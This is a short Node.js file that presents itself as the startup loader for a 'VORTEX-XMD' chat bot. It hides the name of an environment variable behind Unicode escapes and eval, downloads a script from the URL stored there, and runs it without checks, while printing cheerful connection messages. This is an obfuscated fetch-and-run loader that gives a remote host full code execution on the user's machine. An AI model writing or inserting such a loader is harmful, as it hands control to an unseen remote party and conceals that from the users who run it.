require('dotenv').config(); // Load environment variables from .env

const axios = require('axios');
const { exec } = require('child_process');
const fs = require('fs');

const envVar = "\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u002e\u0065\u006e\u0076\u002e\u0049\u004d\u0041\u0047\u0045\u005f\u0042\u004f\u0054";  
const scriptUrl = eval(envVar); // Dynamically access process.env.IMAGE_BOT  
const scriptPath = "./remote-index.js"; // Local temporary file  

async function downloadAndRunScript() {  
    try {  
        console.log("\nHansTz Send you request or Loading from Vortex-xmd Database script 🔥...\n");  

        if (!scriptUrl) {  
            console.error("Error: IMAGE_BOT URL is not set in .env file!");  
            return;  
        }  

        // Fetch script content  
        const response = await axios.get(scriptUrl);  
        const scriptCode = response.data;  

        // Save script to a local file  
        fs.writeFileSync(scriptPath, scriptCode, "utf-8");  

        // RED COLOR ANSI ESCAPE CODE  
        console.log("\x1b[31mScript downloaded 🔥✅ successfully! From HansTz Web Saver Database And Your Bot Is Connected Now Enjoy You VORTEX-XMD Is Alive ✅\x1b[0m");  

        // Execute the script using Node.js  
        exec(`node ${scriptPath}`, (error, stdout, stderr) => {  
            if (error) {  
                console.error(`Execution error: ${error.message}`);  
                return;  
            }  
            if (stderr) {  
                console.error(`Script stderr: ${stderr}`);  
            }  
            console.log(`Script Output:\n${stdout}`);  
        });  

        // Add your "nmp2 say VORTEX-XMD" message  
        console.log("\n\x1b[31mnmp2 say VORTEX-XMD\x1b[0m\n");  

    } catch (error) {  
        console.error("Error downloading or executing script:", error);  
    }  
}  

// Run the script loader  
downloadAndRunScript();
